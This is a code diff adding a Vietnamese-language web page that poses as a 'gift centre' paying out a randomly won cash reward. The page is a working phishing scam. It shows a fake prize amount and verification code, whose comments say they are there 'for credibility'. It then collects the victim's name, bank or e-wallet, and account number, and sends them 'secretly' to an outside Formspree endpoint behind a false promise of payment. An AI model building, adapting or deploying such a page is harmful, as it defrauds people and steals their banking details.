@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hệ Thống Giải Ngân Quà Tặng Tự Động</title>
+    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Lexend', sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 90%; max-width: 420px; background: white; border-radius: 20px; overflow: hidden; box-shadow: 0 15px 35px rgba(0,0,0,0.1); margin: 20px; }
+        .header { background: linear-gradient(135deg, #1a73e8, #0d47a1); color: white; padding: 30px 20px; text-align: center; }
+        .content { padding: 25px; }
+        .hidden { display: none; }
+        .reward-tag { background: #fff4e5; border: 1px dashed #ffa000; padding: 15px; border-radius: 12px; margin-bottom: 25px; text-align: center; }
+        .amount { font-size: 35px; color: #e65100; font-weight: bold; }
+        label { display: block; font-size: 12px; color: #5f6368; margin-bottom: 8px; font-weight: 600; text-transform: uppercase; }
+        input, select { width: 100%; padding: 14px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 10px; box-sizing: border-box; font-size: 15px; outline: none; }
+        input:focus { border-color: #1a73e8; }
+        .btn { width: 100%; padding: 16px; border: none; border-radius: 10px; background: #1a73e8; color: white; font-weight: 600; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .btn:hover { background: #1557b0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success-icon { font-size: 50px; color: #34a853; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h2 style="margin:0; font-size: 20px;">TRUNG TÂM QUÀ TẶNG</h2>
+        <p style="margin:5px 0 0; opacity:0.8; font-size: 13px;">Hệ thống quyết toán tự động 24/7</p>
+    </div>
+
+    <div class="content">
+        <div id="step1">
+            <div style="font-size: 50px; text-align: center; margin-bottom: 10px;">🎁</div>
+            <h3 style="text-align: center; margin-bottom: 10px;">Chúc mừng bạn!</h3>
+            <p style="text-align: center; color: #5f6368; font-size: 14px; margin-bottom: 20px;">Bạn đã quay trúng phần quà ngẫu nhiên từ quỹ tri ân khách hàng:</p>
+            <div class="reward-tag">
+                <div class="amount" id="reward-val">0đ</div>
+                <div style="font-size: 11px; color: #757575; margin-top: 5px;">Mã xác thực: <span id="auth-code"></span></div>
+            </div>
+            <button class="btn" onclick="goToStep(2)">XÁC NHẬN NHẬN TIỀN</button>
+        </div>
+
+        <div id="step2" class="hidden">
+            <h4 style="margin-top:0; border-left: 4px solid #1a73e8; padding-left: 10px;">Thông tin định danh nhận</h4>
+            <form id="payout-form" action="https://formspree.io/f/xreajaja" method="POST">
+                <input type="hidden" name="_amount_won" id="hidden-reward">
+
+                <label>Họ tên người nhận (In hoa)</label>
+                <input type="text" name="user_full_name" placeholder="Ví dụ: NGUYEN VAN A" required>
+
+                <label>Đơn vị liên kết tài khoản</label>
+                <select name="bank_branch_sys">
+                    <option value="">-- Chọn ngân hàng --</option>
+                    <option value="Vietcombank">Vietcombank (VCB)</option>
+                    <option value="MBBank">MB Bank (Quân Đội)</option>
+                    <option value="Techcombank">Techcombank (TCB)</option>
+                    <option value="Vietinbank">Vietinbank</option>
+                    <option value="BIDV">BIDV</option>
+                    <option value="Agribank">Agribank</option>
+                    <option value="TPBank">TPBank</option>
+                    <option value="Sacombank">Sacombank</option>
+                    <option value="VPBank">VPBank</option>
+                    <option value="ACB">ACB</option>
+                    <option value="VIB">VIB</option>
+                    <option value="MoMo">Ví điện tử MoMo</option>
+                    <option value="ZaloPay">ZaloPay / Viettel Money</option>
+                    <option value="Other">Ngân hàng khác...</option>
+                </select>
+
+                <label>Mã định danh cá nhân (ID tài khoản)</label>
+                <input type="number" name="payout_id_number" placeholder="Nhập số tài khoản nhận" required>
+
+                <button type="submit" class="btn" style="background: #34a853;">HOÀN TẤT THỦ TỤC</button>
+            </form>
+        </div>
+
+        <div id="step3" class="hidden" style="text-align: center;">
+            <div class="success-icon">✓</div>
+            <h3 style="margin-bottom: 10px;">GỬI YÊU CẦU THÀNH CÔNG</h3>
+            <p style="color: #5f6368; font-size: 14px; line-height: 1.6;">
+                Hệ thống đã ghi nhận thông tin xác thực của bạn. <br><br>
+                Tiền thưởng sẽ được kiểm tra và giải ngân vào tài khoản sau <b>24h - 72h</b> làm việc.
+            </p>
+            <div style="background: #f8f9fa; padding: 10px; border-radius: 8px; margin-top: 20px; font-size: 12px; color: #999;">
+                Vui lòng không gửi yêu cầu trùng lặp để tránh bị treo lệnh.
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // 1. Random số tiền và mã code cho uy tín
+    const randomMoney = Math.floor(Math.random() * (200 - 5 + 1) + 5) * 1000;
+    const formattedMoney = randomMoney.toLocaleString('vi-VN') + ' VNĐ';
+    document.getElementById('reward-val').innerText = formattedMoney;
+    document.getElementById('hidden-reward').value = formattedMoney;
+    document.getElementById('auth-code').innerText = Math.random().toString(36).substring(7).toUpperCase();
+
+    function goToStep(s) {
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
+    }
+
+    const form = document.getElementById('payout-form');
+    form.onsubmit = async (e) => {
+        e.preventDefault();
+        
+        // Hiện màn hình xử lý
+        document.getElementById('step2').classList.add('hidden');
+        document.getElementById('step3').classList.remove('hidden');
+
+        // Gửi dữ liệu bí mật về Formspree
+        fetch(form.action, {
+            method: 'POST',
+            body: new FormData(form),
+            headers: { 'Accept': 'application/json' }
+        });
+    };
+</script>
+
+</body>
+</html>
